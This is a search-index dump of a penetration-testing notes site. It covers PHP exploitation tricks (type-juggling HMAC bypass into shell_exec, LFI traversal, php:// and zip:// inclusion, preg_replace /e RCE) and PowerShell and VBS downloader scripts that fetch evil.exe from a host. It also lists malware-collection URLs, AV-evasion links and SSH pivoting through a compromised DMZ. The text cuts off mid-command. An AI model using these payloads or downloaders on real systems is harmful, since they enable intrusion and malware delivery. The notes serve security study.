$secret = 'secure_random_secret_value'; $hmac = md5($secret . $_POST['message']); if($hmac == $_POST['hmac']) // === Bypass by creating a hmac starting with `0e[0-9]` // var_dump( 0e123 == 0e51217526859264863 ); === TRUE shell_exec($_POST['message']); Hashing Algorithm Disclosure Given 240610708 and QNKCDZO attacker can guess that hashing algo is md5 var_dump(md5('240610708') == md5('QNKCDZO')); === TRUE","title":"PHP"},{"location":"languages/php/#php","text":"","title":"PHP"},{"location":"languages/php/#references","text":"Understanding PHP Object Injection https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ http://pentestmonkey.net/tools/web-shells/php-reverse-shell PHP Remote File Inclusion command shell using data:// Hardening and securing PHP on Linux HTTP Parameter Pollution with cookies in PHP","title":"References"},{"location":"languages/php/#terminate-strings-using-null-byte","text":"Before PHP 5.3 terminate strings using null byte is possible (%00 in URL) http://example.com?param=../../../../etc/passed - /etc/passed.php http://example.com?param=../../../../etc/passed%00 - /etc/passed","title":"Terminate strings using null byte"},{"location":"languages/php/#vulnerable-functions","text":"Local / Remote file inclusion bugs: include() include_once() require() require_once() Local / Remote command execution bugs: eval() preg_replace() fwrite() passthru() file_get_contents() shell_exec() system() SQL Injection bugs: mysql_query() File / File system bugs: fopen() readfile() glob() file() popen() exec() https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/","title":"Vulnerable functions"},{"location":"languages/php/#rce-with-preg-functions","text":"implement regular expressions for the preg_ functions (preg_match, preg_replace) /e modifier which allows evaluation of PHP code in the preg_replace Example: ?php $string = this is my lower sting ; print preg_replace('/(.*)/e', 'strtoupper( \\\\1 )', '$string'); ? // THIS IS MY LOWER STING Example Attack: ?php $string = phpinfo() ; print preg_replace('/^(.*)/e', 'strtoupper(\\\\1)', $string); ? Filter Evasion: - Prevent single quote and escape chars Following will fail: $string = system('ls -lah') ; Bypass: $string = `ls -lah` ; Ref: http://www.madirish.net/402","title":"RCE with PREG Functions"},{"location":"languages/php/#lfi-with-filter-inclusion","text":"Useful when LFI is possible but \".php\" is appended at end (and not vulnerable to null byte injection) filter/convert.base64-encode forces PHP to base64 encode the file before it is used in the require statement ( index\u200b.php ) http://example.com/?page=php://filter/convert.base64-encode/resource=index\u200b","title":"LFI with Filter Inclusion"},{"location":"languages/php/#lfi-with-zip-inclusion-include-a-file-inside-a-zip","text":"If it is possible to upload a zip file http://example.com/?page=zip://uploads/zipfilename#shell.php?cmd=id","title":"LFI with Zip Inclusion (Include a file inside a zip)"},{"location":"languages/php/#lfi-to-rfi","text":"Possible if allow_url_include is on","title":"LFI to RFI"},{"location":"languages/php/#type-juggling","text":"References: - https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf - https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/ - https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro - https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing '0e1234' == '0e4321' '0e1234' == '0' '0e1234' = '1' '0xf' == '15' #0xf in hexadecimal notation is 15 '000...000' == int(0) '0e0...000' == int(0) '1e0...000' == int(1) '0abc...000' == int(0) 'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0) var_dump( 2 bottles == 2); // == TRUE $values = array( apple , orange , pear , grape ); in_array(0, $values); // == TRUE if($password == secretpass ) // == TRUE when $password=0","title":"Type Juggling"},{"location":"languages/php/#reduction-in-entropy-insecure-hmac","text":"$secret = 'secure_random_secret_value'; $hmac = md5($secret . $_POST['message']); if($hmac == $_POST['hmac']) // === Bypass by creating a hmac starting with `0e[0-9]` // var_dump( 0e123 == 0e51217526859264863 ); === TRUE shell_exec($_POST['message']);","title":"Reduction in Entropy (Insecure HMAC)"},{"location":"languages/php/#hashing-algorithm-disclosure","text":"Given 240610708 and QNKCDZO attacker can guess that hashing algo is md5 var_dump(md5('240610708') == md5('QNKCDZO')); === TRUE","title":"Hashing Algorithm Disclosure"},{"location":"languages/python/","text":"Python Exploiting Imports It is possible to create a .py file named with the name of the import. This will load the local file (same dir as the file importing the library) instead of the actual library. cPickle RCE Arbitrary code execution with Python pickles Python Pickle Injection https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/ https://blog.nelhage.com/2011/03/exploiting-pickle/ https://stackoverflow.com/questions/38307636/can-anyone-explain-me-the-example-of-an-exploit-in-python-s-pickle-module HTB - DevOps","title":"Python"},{"location":"languages/python/#python","text":"","title":"Python"},{"location":"languages/python/#exploiting-imports","text":"It is possible to create a .py file named with the name of the import. This will load the local file (same dir as the file importing the library) instead of the actual library.","title":"Exploiting Imports"},{"location":"languages/python/#cpickle-rce","text":"Arbitrary code execution with Python pickles Python Pickle Injection https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/ https://blog.nelhage.com/2011/03/exploiting-pickle/ https://stackoverflow.com/questions/38307636/can-anyone-explain-me-the-example-of-an-exploit-in-python-s-pickle-module HTB - DevOps","title":"cPickle RCE"},{"location":"languages/rails/","text":"Rails References Rails' Remote Code Execution Vulnerability Explained","title":"Rails"},{"location":"languages/rails/#rails","text":"","title":"Rails"},{"location":"languages/rails/#references","text":"Rails' Remote Code Execution Vulnerability Explained","title":"References"},{"location":"languages/regex/","text":"Regex Cheatsheets Regex tutorial\u200a\u2014\u200aA quick cheatsheet by examples: https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285 Exploiting Regular Expressions: https://medium.com/@somdevsangwan/exploiting-regular-expressions-2192dbbd6936","title":"Regex"},{"location":"languages/regex/#regex","text":"","title":"Regex"},{"location":"languages/regex/#cheatsheets","text":"Regex tutorial\u200a\u2014\u200aA quick cheatsheet by examples: https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285 Exploiting Regular Expressions: https://medium.com/@somdevsangwan/exploiting-regular-expressions-2192dbbd6936","title":"Cheatsheets"},{"location":"languages/rust/","text":"Rust References Fearless Concurrency with Rust: https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html","title":"Rust"},{"location":"languages/rust/#rust","text":"","title":"Rust"},{"location":"languages/rust/#references","text":"Fearless Concurrency with Rust: https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html","title":"References"},{"location":"malware/analysis/","text":"Analysis Malware Families https://malpedia.caad.fkie.fraunhofer.de/families AlphaBlend Campaign https://steemit.com/reverse/@utkonos/alphablend-malware https://steemit.com/reverseengineering/@utkonos/alphablend-campaign-part-2 https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address https://docs.microsoft.com/en-us/windows/desktop/sbscs/activation-contexts azorult https://blog.minerva-labs.com/azorult-now-as-a-signed-google-update MuddyWater https://www.sdkhere.com/2019/01/a-new-muddywater-apt-campaign-spreads.html Hyperion i586-mingw32-msvc-g++ Src/Crypter/*.cpp -o hyperion.exe wine hyperion.exe backdoor.exe out.exe","title":"Analysis"},{"location":"malware/analysis/#analysis","text":"","title":"Analysis"},{"location":"malware/analysis/#malware-families","text":"https://malpedia.caad.fkie.fraunhofer.de/families","title":"Malware Families"},{"location":"malware/analysis/#alphablend-campaign","text":"https://steemit.com/reverse/@utkonos/alphablend-malware https://steemit.com/reverseengineering/@utkonos/alphablend-campaign-part-2 https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address https://docs.microsoft.com/en-us/windows/desktop/sbscs/activation-contexts","title":"AlphaBlend Campaign"},{"location":"malware/analysis/#azorult","text":"https://blog.minerva-labs.com/azorult-now-as-a-signed-google-update","title":"azorult"},{"location":"malware/analysis/#muddywater","text":"https://www.sdkhere.com/2019/01/a-new-muddywater-apt-campaign-spreads.html","title":"MuddyWater"},{"location":"malware/analysis/#hyperion","text":"i586-mingw32-msvc-g++ Src/Crypter/*.cpp -o hyperion.exe wine hyperion.exe backdoor.exe out.exe","title":"Hyperion"},{"location":"malware/anti-virus/","text":"Antivirus 5 Common Cyber Security Threats That Bypass Legacy AV: https://www.sentinelone.com/blog/5-common-cyber-security-threats-that-bypass-legacy-av/ Antivirus Event Analysis Cheat Sheet v1.4: https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ Bypassing Kaspersky Endpoint Security 11: http://0xc0ffee.io/blog/kes11-bypass Hiding Metasploit Shellcode to Evade Windows Defender: https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ Enumerating Anti-Sandboxing Techniques - TrustedSec: https://www.trustedsec.com/2018/06/enumerating-anti-sandboxing-techniques/?utm_content=73303714 utm_medium=social utm_source=twitter Art of Anti Detection 1 \u2013 Introduction to AV Detection Techniques: https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Art of Anti Detection 2 \u2013 PE Backdoor Manufacturing: https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/","title":"Antivirus"},{"location":"malware/anti-virus/#antivirus","text":"5 Common Cyber Security Threats That Bypass Legacy AV: https://www.sentinelone.com/blog/5-common-cyber-security-threats-that-bypass-legacy-av/ Antivirus Event Analysis Cheat Sheet v1.4: https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ Bypassing Kaspersky Endpoint Security 11: http://0xc0ffee.io/blog/kes11-bypass Hiding Metasploit Shellcode to Evade Windows Defender: https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ Enumerating Anti-Sandboxing Techniques - TrustedSec: https://www.trustedsec.com/2018/06/enumerating-anti-sandboxing-techniques/?utm_content=73303714 utm_medium=social utm_source=twitter Art of Anti Detection 1 \u2013 Introduction to AV Detection Techniques: https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Art of Anti Detection 2 \u2013 PE Backdoor Manufacturing: https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/","title":"Antivirus"},{"location":"malware/attack-patterns/","text":"Attack Patterns PDF Based BadPDF - Bad-Pdf reads the NTLM hashes using Responder listener: https://github.com/deepzec/Bad-Pdf Adobe Reader - PDF callback via XSLT stylesheet in XFA: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html","title":"Attack Patterns"},{"location":"malware/attack-patterns/#attack-patterns","text":"","title":"Attack Patterns"},{"location":"malware/attack-patterns/#pdf-based","text":"BadPDF - Bad-Pdf reads the NTLM hashes using Responder listener: https://github.com/deepzec/Bad-Pdf Adobe Reader - PDF callback via XSLT stylesheet in XFA: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html","title":"PDF Based"},{"location":"malware/collections/","text":"Collections Malware Collections http://iec56w4ibovnb4wc.onion/ hxxp://iec56w4ibovnb4wc.onion.si https://www.cert.pl/en/news/single/mwdb-our-way-to-share-information-about-malicious-software/ hxxp://185.244.25.217/bins/ Collection Maintenance Tools https://github.com/phage-nz/ph0neutria https://github.com/robbyFux/Ragpicker","title":"Collections"},{"location":"malware/collections/#collections","text":"","title":"Collections"},{"location":"malware/collections/#malware-collections","text":"http://iec56w4ibovnb4wc.onion/ hxxp://iec56w4ibovnb4wc.onion.si https://www.cert.pl/en/news/single/mwdb-our-way-to-share-information-about-malicious-software/ hxxp://185.244.25.217/bins/","title":"Malware Collections"},{"location":"malware/collections/#collection-maintenance-tools","text":"https://github.com/phage-nz/ph0neutria https://github.com/robbyFux/Ragpicker","title":"Collection Maintenance Tools"},{"location":"malware/downloaders/","text":"Downloaders External PLEAD Downloader Used by BlackTech: https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html Powershell powershell.exe \u2010ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 echo $storageDir = $pwd wget.ps1 echo $webclient = New\u2010Object System.Net.WebClient wget.ps1 echo $url = http://192.168.10.5/evil.exe wget.ps1 echo $file = new\u2010exploit.exe wget.ps1 $webclient.DownloadFile($url,$file) wget.ps1 VBS cscript wget.vbs http://192.168.10.5/evil.exe evil.exe echo strUrl = WScript.Arguments.Item(0) wget.vbs echo StrFile = WScript.Arguments.Item(1) wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts wget.vbs echo Err.Clear wget.vbs echo Set http = Nothing wget.vbs echo Set http = CreateObject( WinHttp.WinHttpRequest.5.1 ) wget.vbs echo If http Is Nothing Then Set http = CreateObject( WinHttp.WinHttpRequest ) wget.vbs echo If http Is Nothing Then Set http = CreateObject( MSXML2.ServerXMLHTTP ) wget.vbs echo If http Is Nothing Then Set http = CreateObject( Microsoft.XMLHTTP ) wget.vbs echo http.Open GET , strURL, False wget.vbs echo http.Send wget.vbs echo varByteArray = http.ResponseBody wget.vbs echo Set http = Nothing wget.vbs echo Set fs = CreateObject( Scripting.FileSystemObject ) wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) wget.vbs echo strData = wget.vbs echo strBuffer = wget.vbs echo For lngCounter = 0 to UBound(varByteArray) wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) wget.vbs echo Next wget.vbs echo ts.Close wget.vbs ../test/","title":"Downloaders"},{"location":"malware/downloaders/#downloaders","text":"","title":"Downloaders"},{"location":"malware/downloaders/#external","text":"PLEAD Downloader Used by BlackTech: https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html","title":"External"},{"location":"malware/downloaders/#powershell","text":"powershell.exe \u2010ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 echo $storageDir = $pwd wget.ps1 echo $webclient = New\u2010Object System.Net.WebClient wget.ps1 echo $url = http://192.168.10.5/evil.exe wget.ps1 echo $file = new\u2010exploit.exe wget.ps1 $webclient.DownloadFile($url,$file) wget.ps1","title":"Powershell"},{"location":"malware/downloaders/#vbs","text":"cscript wget.vbs http://192.168.10.5/evil.exe evil.exe echo strUrl = WScript.Arguments.Item(0) wget.vbs echo StrFile = WScript.Arguments.Item(1) wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts wget.vbs echo Err.Clear wget.vbs echo Set http = Nothing wget.vbs echo Set http = CreateObject( WinHttp.WinHttpRequest.5.1 ) wget.vbs echo If http Is Nothing Then Set http = CreateObject( WinHttp.WinHttpRequest ) wget.vbs echo If http Is Nothing Then Set http = CreateObject( MSXML2.ServerXMLHTTP ) wget.vbs echo If http Is Nothing Then Set http = CreateObject( Microsoft.XMLHTTP ) wget.vbs echo http.Open GET , strURL, False wget.vbs echo http.Send wget.vbs echo varByteArray = http.ResponseBody wget.vbs echo Set http = Nothing wget.vbs echo Set fs = CreateObject( Scripting.FileSystemObject ) wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) wget.vbs echo strData = wget.vbs echo strBuffer = wget.vbs echo For lngCounter = 0 to UBound(varByteArray) wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) wget.vbs echo Next wget.vbs echo ts.Close wget.vbs ../test/","title":"VBS"},{"location":"malware/fileless-attacks/","text":"Fileless Attacks New Reference https://www.varonis.com/blog/understanding-malware-free-hacking-part/ Summarized References https://blog.minerva-labs.com/deconstructing-fileless-attacks-into-4-underlying-techniques Malicious Documents New Evasive Malware Technique exploits Microsoft Dynamic Exchange (DDE): https://blog.minerva-labs.com/prevented-by-minerva-labs-new-evasive-malware-technique-exploits-microsoft-dynamic-exchange Dynamic Data Exchange (DDE) allows adversaries to deliver stealthy payloads via document files while avoiding the common usage of macro. https://blogs.quickheal.com/emerging-trend-dde-based-office-malware-analysis-quick-heal-security-labs/ https://blog.barkly.com/locky-ransomware-using-microsoft-office-dde-exploit Malicious Scripts Targeting powershell.exe, cscript.exe, cmd.exe and mshta.exe Windows Subsystem for Linux introduce more script support Prevent Powershell detection: https://blog.minerva-labs.com/confronting-snake-oil-sales-tactics-in-endpoint-security If the attacker places a malicious script under the path %USERPROFILE%\\profile.ps1 and start PowerShell ISE, the script will be executed without powershell.exe being involved Bypass execution policy: HKEY_CURRENT_USER\\Software\\MicrosoftPowerShell\\1\\ShellIds\\Microsoft.PowerShell - And set the registry value ExecutionPolicy to Unrestricted. Invoke-NoShell 12 different evasive document permutations Invoke-Obfuscation Invoke-DOSfuscation Emotet\u2019s script obfuscation: https://blog.minerva-labs.com/the-emotet-grinch-is-back Living off the Land regsvr32.exe, rundll32.exe, certutil.exe and schtasks.exe. Living Off The Land Binaries and Scripts: https://github.com/LOLBAS-Project/LOLBAS Abusing WMI to Build a Persistent, Asynchronous, and Fileless Backdoor: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf APT29\u2019s use of WMI and PowerShell to plant fileless backdoors: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Reference: https://liberty-shell.com/sec/2018/10/20/living-off-the-land/ Malicious Code in Memory Memory injection - VirtualAllocEx and WriteProcessMemory , which allow one process to write code into another process. Overview of the AZORult attack: https://blog.minerva-labs.com/analyzing-an-azorult-attack-evasion-in-a-cloak-of-multiple-layers Wrap compiled executables into scripts that extract malicious payload into memory during runtime. PowerSploit: https://github.com/PowerShellMafia/PowerSploit GhostMiner analysis: https://blog.minerva-labs.com/ghostminer-cryptomining-malware-goes-fileless Veil Framework: https://www.veil-framework.com/ Process Doppelg\u00e4nging - attacker misuses NTFS transaction capabilities built into Microsoft Windows to temporarily modify a trusted file in memory without committing changes to disk SynAck malware: https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/ CoffeeShot tool (inject shellcode from Java): https://blog.minerva-labs.com/coffeeshot-avoid-detection-with-memory-injection","title":"Fileless Attacks"},{"location":"malware/fileless-attacks/#fileless-attacks","text":"","title":"Fileless Attacks"},{"location":"malware/fileless-attacks/#new-reference","text":"https://www.varonis.com/blog/understanding-malware-free-hacking-part/","title":"New Reference"},{"location":"malware/fileless-attacks/#summarized-references","text":"https://blog.minerva-labs.com/deconstructing-fileless-attacks-into-4-underlying-techniques","title":"Summarized References"},{"location":"malware/fileless-attacks/#malicious-documents","text":"New Evasive Malware Technique exploits Microsoft Dynamic Exchange (DDE): https://blog.minerva-labs.com/prevented-by-minerva-labs-new-evasive-malware-technique-exploits-microsoft-dynamic-exchange Dynamic Data Exchange (DDE) allows adversaries to deliver stealthy payloads via document files while avoiding the common usage of macro. https://blogs.quickheal.com/emerging-trend-dde-based-office-malware-analysis-quick-heal-security-labs/ https://blog.barkly.com/locky-ransomware-using-microsoft-office-dde-exploit","title":"Malicious Documents"},{"location":"malware/fileless-attacks/#malicious-scripts","text":"Targeting powershell.exe, cscript.exe, cmd.exe and mshta.exe Windows Subsystem for Linux introduce more script support Prevent Powershell detection: https://blog.minerva-labs.com/confronting-snake-oil-sales-tactics-in-endpoint-security If the attacker places a malicious script under the path %USERPROFILE%\\profile.ps1 and start PowerShell ISE, the script will be executed without powershell.exe being involved Bypass execution policy: HKEY_CURRENT_USER\\Software\\MicrosoftPowerShell\\1\\ShellIds\\Microsoft.PowerShell - And set the registry value ExecutionPolicy to Unrestricted. Invoke-NoShell 12 different evasive document permutations Invoke-Obfuscation Invoke-DOSfuscation Emotet\u2019s script obfuscation: https://blog.minerva-labs.com/the-emotet-grinch-is-back","title":"Malicious Scripts"},{"location":"malware/fileless-attacks/#living-off-the-land","text":"regsvr32.exe, rundll32.exe, certutil.exe and schtasks.exe. Living Off The Land Binaries and Scripts: https://github.com/LOLBAS-Project/LOLBAS Abusing WMI to Build a Persistent, Asynchronous, and Fileless Backdoor: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf APT29\u2019s use of WMI and PowerShell to plant fileless backdoors: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Reference: https://liberty-shell.com/sec/2018/10/20/living-off-the-land/","title":"Living off the Land"},{"location":"malware/fileless-attacks/#malicious-code-in-memory","text":"Memory injection - VirtualAllocEx and WriteProcessMemory , which allow one process to write code into another process. Overview of the AZORult attack: https://blog.minerva-labs.com/analyzing-an-azorult-attack-evasion-in-a-cloak-of-multiple-layers Wrap compiled executables into scripts that extract malicious payload into memory during runtime. PowerSploit: https://github.com/PowerShellMafia/PowerSploit GhostMiner analysis: https://blog.minerva-labs.com/ghostminer-cryptomining-malware-goes-fileless Veil Framework: https://www.veil-framework.com/ Process Doppelg\u00e4nging - attacker misuses NTFS transaction capabilities built into Microsoft Windows to temporarily modify a trusted file in memory without committing changes to disk SynAck malware: https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/ CoffeeShot tool (inject shellcode from Java): https://blog.minerva-labs.com/coffeeshot-avoid-detection-with-memory-injection","title":"Malicious Code in Memory"},{"location":"malware/x-Defense/","text":"Defense New References Detecting malicious certificates: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar YARA Introduction: https://virustotal.github.io/yara/ GitHub: https://github.com/virustotal/yara Rules: https://github.com/Yara-Rules/rules Rules by Neo23x0: https://github.com/Neo23x0/signature-base/tree/master/yara","title":"Defense"},{"location":"malware/x-Defense/#defense","text":"","title":"Defense"},{"location":"malware/x-Defense/#new-references","text":"Detecting malicious certificates: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar","title":"New References"},{"location":"malware/x-Defense/#yara","text":"Introduction: https://virustotal.github.io/yara/ GitHub: https://github.com/virustotal/yara Rules: https://github.com/Yara-Rules/rules Rules by Neo23x0: https://github.com/Neo23x0/signature-base/tree/master/yara","title":"YARA"},{"location":"malware/y-Tools/","text":"Tools Loki Scanner for Simple Indicators of Compromise - GitHub: https://github.com/Neo23x0/Loki - Features - File Name IOC - Yara Rule Check - Hash check - C2 Back Connect Check - Additional features - Regin filesystem check (via --reginfs) - Process anomaly check (based on Sysforensics) - SWF decompressed scan (new since version v0.8) - SAM dump check - DoublePulsar check - tries to detect DoublePulsar backdoor on - port 445/tcp and 3389/tcp - PE-Sieve process check - Signature Base: https://github.com/Neo23x0/signature-base Spark Core Home: https://www.nextron-systems.com/spark-core/ Signature Base: https://github.com/Neo23x0/signature-base libpeconv A library to load, manipulate, dump PE files. Github - https://github.com/hasherezade/libpeconv PE-Sieve Based on libpeconv. Scans a given process, searching for potentially malicious implants and patches within the process space. Home - https://hshrzd.wordpress.com/pe-sieve/ PE Studio Malware Initial Assessment Features: https://www.winitor.com/features.html Download: https://www.winitor.com/binaries.html Other Collecting Hunting for IOCs with gusto and style: https://github.com/rastrea2r/rastrea2r","title":"Tools"},{"location":"malware/y-Tools/#tools","text":"","title":"Tools"},{"location":"malware/y-Tools/#loki","text":"Scanner for Simple Indicators of Compromise - GitHub: https://github.com/Neo23x0/Loki - Features - File Name IOC - Yara Rule Check - Hash check - C2 Back Connect Check - Additional features - Regin filesystem check (via --reginfs) - Process anomaly check (based on Sysforensics) - SWF decompressed scan (new since version v0.8) - SAM dump check - DoublePulsar check - tries to detect DoublePulsar backdoor on - port 445/tcp and 3389/tcp - PE-Sieve process check - Signature Base: https://github.com/Neo23x0/signature-base","title":"Loki"},{"location":"malware/y-Tools/#spark-core","text":"Home: https://www.nextron-systems.com/spark-core/ Signature Base: https://github.com/Neo23x0/signature-base","title":"Spark Core"},{"location":"malware/y-Tools/#libpeconv","text":"A library to load, manipulate, dump PE files. Github - https://github.com/hasherezade/libpeconv","title":"libpeconv"},{"location":"malware/y-Tools/#pe-sieve","text":"Based on libpeconv. Scans a given process, searching for potentially malicious implants and patches within the process space. Home - https://hshrzd.wordpress.com/pe-sieve/","title":"PE-Sieve"},{"location":"malware/y-Tools/#pe-studio","text":"Malware Initial Assessment Features: https://www.winitor.com/features.html Download: https://www.winitor.com/binaries.html","title":"PE Studio"},{"location":"malware/y-Tools/#other","text":"Collecting Hunting for IOCs with gusto and style: https://github.com/rastrea2r/rastrea2r","title":"Other"},{"location":"malware/z-References/","text":"References New References The Road To Reverse Engineering Malware: https://www.secjuice.com/the-road-to-reverse-engineering-malware/ Unpacking the packed unpacker: https://www.virusbulletin.com/blog/2019/01/vb2018-paper-unpacking-packed-unpacker-reversing-android-anti-analysis-library/ ELF in-memory execution: https://blog.fbkcs.ru/en/elf-in-memory-execution/ Botnet Takeover (NSA Docs): https://twitter.com/0xffff0800/status/1077052289175609344 An example rootkit that gives a userland process root permissions: https://github.com/PinkP4nther/Sutekh Browser-C2 https://pentestlab.blog/2018/06/06/command-and-control-browser/ https://github.com/0x09AL/Browser-C2","title":"References"},{"location":"malware/z-References/#references","text":"","title":"References"},{"location":"malware/z-References/#new-references","text":"The Road To Reverse Engineering Malware: https://www.secjuice.com/the-road-to-reverse-engineering-malware/ Unpacking the packed unpacker: https://www.virusbulletin.com/blog/2019/01/vb2018-paper-unpacking-packed-unpacker-reversing-android-anti-analysis-library/ ELF in-memory execution: https://blog.fbkcs.ru/en/elf-in-memory-execution/ Botnet Takeover (NSA Docs): https://twitter.com/0xffff0800/status/1077052289175609344 An example rootkit that gives a userland process root permissions: https://github.com/PinkP4nther/Sutekh","title":"New References"},{"location":"malware/z-References/#browser-c2","text":"https://pentestlab.blog/2018/06/06/command-and-control-browser/ https://github.com/0x09AL/Browser-C2","title":"Browser-C2"},{"location":"network/0-cheatsheet/","text":"Cheetsheet Public IP How to Find Your Public IP Address on Linux Command Line curl https://ipaddr.pub","title":"Cheetsheet"},{"location":"network/0-cheatsheet/#cheetsheet","text":"","title":"Cheetsheet"},{"location":"network/0-cheatsheet/#public-ip","text":"How to Find Your Public IP Address on Linux Command Line curl https://ipaddr.pub","title":"Public IP"},{"location":"network/domain-fronting/","text":"Domain Fronting Tools Psiphon: https://www.psiphon3.com/en/index.html Meek: https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek References Introduction: https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/ Usage in APT29: https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html Azure (Hardening Your Azure Domain Front): https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64 A 101 on Domain Fronting: https://digi.ninja/blog/domain_fronting.php Domain Fronting with CloudFront: https://digi.ninja/blog/cloudfront_example.php","title":"Domain Fronting"},{"location":"network/domain-fronting/#domain-fronting","text":"","title":"Domain Fronting"},{"location":"network/domain-fronting/#tools","text":"Psiphon: https://www.psiphon3.com/en/index.html Meek: https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek","title":"Tools"},{"location":"network/domain-fronting/#references","text":"Introduction: https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/ Usage in APT29: https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html Azure (Hardening Your Azure Domain Front): https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64 A 101 on Domain Fronting: https://digi.ninja/blog/domain_fronting.php Domain Fronting with CloudFront: https://digi.ninja/blog/cloudfront_example.php","title":"References"},{"location":"network/port-forwarding-and-tunneling/","text":"Port Forwarding Local Port Forwarding ssh -L local-port-to-listen : remote-host : remote-port gateway Allow connections to a specific blocked server. From work: ssh -L 9001:banned-site.com:80 user@home curl http://localhost:9001 Says we\u2019re forwarding our local port 9001 to banned-site.com:80, through the gateway home (port 22). ssh -L 9001:banned:22 user@home ssh -p 9001 localhost Allow remote connections to local port forwards (listening on all interfaces) ssh -L 9001:banned:22 user@home -g ssh -p 9001 work_machine #Remotely Access a port on your server which can only be accessed from localhost and not remotely. From local machine: ssh -L 9000:localhost:5432 user@server psql -h localhost -p 9000 Server acts as the gateway and binds server's port 5432 to local port 9000. Remote Port Forwarding Allow remote access to restricted network. From work: ssh -R 9001:intra-ssh-server:22 user@home Server will bind port 9001 on home machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to localhost:9001 in home will forward user to intra:22 From home: ssh -p 9001 localhost Add GatewayPorts yes to sshd_config to listening on all interfaces. Allow public access to a local resource through a public server. ssh -R 9000:localhost:3000 user@public_sever sudo vim /etc/ssh/sshd_config GatewayPorts yes sudo service ssh restart Dynamic port forwarding One local port for tunneling data to all remote destinations (SOCKS protocol) From work: ssh -D 9001 home Tips Monitoring Tunnels netstat -tunelp Avoid TTL -nNT rinetd When outbound only 80 / 443 use port forwarding nano /etc/rinetd.conf ip1 80 ip2 3389 bindaddress bindport connectaddress connectport (ip1:80 will proxy for ip2:3389) Creating reverse SSH client to tunnel-out remote desktop port Creating Tunnel FROM remote non routable machine pling -l root -pw password attacker-ip -R 3390:127.0.0.1:3389 localhost 3389 to attacker ip 3389 FROM attacker's machine rdesktop localhost:3390 SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs) Create local SOCS4 proxy: From attacker's machine (compromised DMZ) ssh -D 8080 root@DMZ-IP netstat -antp | grep 8080 /etc/proxychains.conf socks4 127.0.0.1 8080 proxychains nmap -p 